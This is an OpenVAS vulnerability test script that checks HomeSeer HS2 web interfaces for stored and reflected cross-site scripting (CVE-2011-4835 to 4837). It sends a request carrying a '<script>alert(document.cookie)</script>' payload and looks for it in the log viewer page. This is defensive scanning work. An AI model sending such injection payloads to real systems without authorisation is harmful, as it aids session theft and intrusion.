###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_homeseer_hs2_web_interface_mult_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# HomeSeer HS2 Web Interface Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902648");
  script_version("$Revision: 11997 $");
  script_cve_id("CVE-2011-4835", "CVE-2011-4836", "CVE-2011-4837");
  script_bugtraq_id(50978);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-20 15:01:39 +0530 (Tue, 20 Dec 2011)");
  script_name("HomeSeer HS2 Web Interface Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/47191/");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/796883");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71713");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("HomeSeer/banner");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in the context of a vulnerable
site and gain sensitive information via directory traversal attacks.");
  script_tag(name:"affected", value:"HomeSeer HS2 version 2.5.0.20");
  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input
passed via the URL, which allows attacker to conduct stored and reflective
xss by sending a crafted request with JavaScript to web interface and
causing the JavaScript to be stored in the log viewer page.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running HomeSeer HS2 and is prone to multiple
vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!get_port_state(port)){
  exit(0);
}

banner = get_http_banner(port: port);

if("Server: HomeSeer" >!< banner) {
  exit(0);
}

sndReq = http_get(item:string("/stat<script>alert(document.cookie)" +
                     "</script>"), port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

if(http_vuln_check(port:port, url:"/elog", pattern:"<script>alert\(" +
                                "document.cookie\)</script>", check_header:TRUE))
{
  security_message(port);
  exit(0);
}

